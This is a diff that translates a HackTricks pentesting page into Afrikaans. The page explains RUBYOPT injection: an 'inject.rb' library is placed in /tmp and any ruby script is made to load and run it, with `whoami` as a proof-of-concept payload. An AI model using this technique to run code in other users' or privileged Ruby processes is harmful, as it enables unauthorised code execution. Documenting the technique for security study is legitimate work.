@@ -4,30 +4,22 @@
 
 ## RUBYOPT
 
-Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.
+Deur hierdie omgewing veranderlike te gebruik, is dit moontlik om **nuwe parameters** by **ruby** te voeg wanneer dit uitgevoer word. Alhoewel die parameter **`-e`** nie gebruik kan word om ruby kode aan te dui om uit te voer nie, is dit moontlik om die parameters **`-I`** en **`-r`** te gebruik om 'n nuwe gids by die biblioteke laai pad te voeg en dan **'n biblioteek aan te dui om te laai**.
 
-Create the library **`inject.rb`** in **`/tmp`**:
-
+Skep die biblioteek **`inject.rb`** in **`/tmp`**:
 ```ruby:inject.rb
 puts `whoami`
 ```
-
-Create anywahere a ruby script like:
-
+Skep enige plek 'n ruby-skrip soos:
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
-
-Then make an arbitrary ruby script load it with:
-
+Dan maak 'n arbitrêre ruby-skrip dit laai met:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-
-Fun fact, it works even with param **`--disable-rubyopt`**:
-
+Interessante feit, dit werk selfs met die param **`--disable-rubyopt`**:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
